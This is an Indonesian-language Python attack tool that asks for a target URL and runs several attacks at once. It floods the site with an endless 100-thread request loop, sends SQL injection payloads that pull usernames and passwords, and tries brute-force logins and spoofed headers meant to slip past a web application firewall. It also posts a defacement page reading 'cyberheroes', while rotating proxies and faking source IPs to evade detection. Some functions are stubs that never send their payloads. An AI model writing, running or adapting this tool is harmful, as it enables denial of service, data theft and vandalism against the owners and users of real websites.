import requests
import random
import string
import logging
import time
import threading
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import re
import base64
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import os
import shutil
import datetime
from fake_useragent import UserAgent
import json

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'
print(f"""{B}

   _____       _     _        _____ _    _ 
  / ____|     | |   | |      / ____| |  | |
 | (___   __ _| | __| |_   _| |    | |__| |
  \___ \ / _` | |/ _` | | | | |    |  __  |
  ____) | (_| | | (_| | |_| | |____| |  | |
 |_____/ \__,_|_|\__,_|\__, |\_____|_|  |_|
                        __/ |              
                       |___/               

""")
logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

def load_file(file_name):
    try:
        file_path = os.path.join('use_agents', file_name)  
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error(f"File {file_name} tidak ditemukan di folder 'use_agents'!")
        return []

USER_AGENTS = load_file('user_agents.txt')
PROXIES = load_file('proxies.txt')

def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// atau https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.))'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None
 
def get_random_user_agent():
    ua = UserAgent()
    return ua.random if USER_AGENTS is None else random.choice(USER_AGENTS)

def random_delay(min_delay=1, max_delay=5):
    delay = random.randint(min_delay, max_delay)
    print(f"Menunggu selama {delay} detik...")
    time.sleep(delay)

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def send_request(url, session, proxy=None):
    try:
        response = session.get(url, proxies=proxy, timeout=5)
        if response.status_code == 200:
            print(f"Permintaan berhasil dikirim ke {url}")
        else:
            print(f"Permintaan gagal: Status Code {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"Terjadi kesalahan: {e}")
        return None

def advanced_waf_bypass(url, session):
    headers = {
        'X-Real-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Injection-By': 'attacker',
        'User-Agent': get_random_user_agent(),
        'X-XSS-Protection': '0',
        'X-Content-Type-Options': 'nosniff',
        'Origin': 'http://attacker.com',
        'X-Custom-Header': base64.b64encode('payload'.encode()).decode(),
        'X-Request-ID': base64.b64encode('malicious_payload'.encode()).decode(),
        'X-DoS-Protection': 'false'
    }

    try:
        response = session.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            print("Custom headers berhasil melewati WAF!")
        else:
            print(f"Gagal melewati WAF dengan custom headers, status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Gagal dengan custom headers: {e}")

def advanced_sql_injection(url, session):
    payloads = [
        "' OR 1=1 --", 
        "' UNION SELECT null, username, password FROM users --", 
        "' AND 1=1 --", 
        "admin' OR 1=1--", 
        "%27%20OR%20%271%27%3D%271%27%3B%20--",
        "admin' AND SLEEP(5)--",
        "admin' AND (SELECT COUNT(*) FROM users)>0--",
        "' OR 'a'='a' --"
    ]
    for payload in payloads:
        send_request(url + "?id=" + payload, session)

def brute_force_login(url, session):
    usernames = ["admin", "root", "user"]
    passwords = ["12345", "password", "admin", "root"]
    for username in usernames:
        for password in passwords:
            payload = {"username": username, "password": password}
            send_request(url + "/login", session)

def flooding_ddos(url, session):
    def flood_target():
        while True:
            send_request(url, session)
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for _ in range(100):
            executor.submit(flood_target)

def csrf_attack(url, session):
    csrf_token = "dummy_csrf_token"
    payload = {"username": "admin", "password": "password", "csrf_token": csrf_token}
    send_request(url + "/login", session)

def deface_payload(url, session, backup_file_path):
    if not os.path.exists(backup_file_path):
        try:
            response = session.get(url)
            with open(backup_file_path, 'w') as f:
                f.write(response.text)
            print("Backup halaman asli berhasil disimpan.")
        except requests.exceptions.RequestException as e:
            print(f"Error saat menyimpan backup halaman: {e}")

    payload = """
    <html>
        <head>
            <title>Website Anda Telah Di H4ck</title>
            <style>
                body {
                    background: linear-gradient(45deg, #1E90FF, #00BFFF, #87CEFA);
                    font-family: Arial, sans-serif;
                    color: white;
                    text-align: center;
                    margin: 0;
                    padding: 0;
                }
                h1 {
                    font-size: 60px;
                    text-shadow: 2px 2px 5px #00008B;
                    margin-top: 20%;
                }
                p {
                    font-size: 20px;
                    margin: 20px auto;
                    width: 70%;
                    text-shadow: 1px 1px 3px #4682B4;
                }
            </style>
        </head>
        <body>
            <h1>cyberheroes</h1>
            <p>website error</p>
            <p>tunggu 24 jam</p>
        </body>
    </html>
    """
    data = {"content": payload}
    
    try:
        response = session.post(url, data=data)
        if response.status_code == 200:
            logging.info(f"Deface berhasil dikirim ke {url}")
            print(f"{G}Deface berhasil! Periksa URL target.{N}")
            print(f"Menunggu selama 24 jam untuk mengembalikan halaman asli...")
            time.sleep(86400)
            restore_backup(url, backup_file_path, session)
        else:
            logging.error(f"Deface gagal, status code: {response.status_code}")
            print(f"{R}Deface gagal! Status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Deface gagal: {e}")
        print(f"{R}Deface gagal: {e}{N}")

def restore_backup(url, backup_file_path, session):
    try:
        with open(backup_file_path, 'r') as f:
            original_content = f.read()
        data = {"content": original_content}
        response = session.post(url, data=data)
        if response.status_code == 200:
            logging.info(f"Halaman asli berhasil dipulihkan di {url}")
            print(f"{G}Halaman asli berhasil dipulihkan.{N}")
        else:
            logging.error(f"Restorasi gagal, status code: {response.status_code}")
            print(f"{R}Restorasi gagal, status code: {response.status_code}{N}")
    except Exception as e:
        logging.error(f"Gagal membaca backup atau mengembalikan halaman: {e}")
        print(f"{R}Error dalam mengembalikan halaman: {e}{N}")

def start_attack(url):
    session = create_session()

    if not is_valid_url(url):
        print(f"{R}URL tidak valid! Periksa URL dan coba lagi.{N}")
        return

    print(f"{Y}Mulai serangan ke: {url}{N}")
    random_delay()

    def ddos_attack():
        flooding_ddos(url, session)

    def login_bruteforce():
        brute_force_login(url, session)

    def sql_injection():
        advanced_sql_injection(url, session)

    def csrf_attack_func():
        csrf_attack(url, session)

    def waf_bypass_func():
        advanced_waf_bypass(url, session)

    def deface_func():
        deface_payload(url, session, "backup_page.html")

    threads = []
    threads.append(threading.Thread(target=ddos_attack))
    threads.append(threading.Thread(target=login_bruteforce))
    threads.append(threading.Thread(target=sql_injection))
    threads.append(threading.Thread(target=csrf_attack_func))
    threads.append(threading.Thread(target=waf_bypass_func))
    threads.append(threading.Thread(target=deface_func))

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    print(f"{G}Serangan selesai!{N}")

def main():
    url = input(f"{B}Masukkan URL target untuk diserang: {N}")
    start_attack(url)

if __name__ == "__main__":
    main()
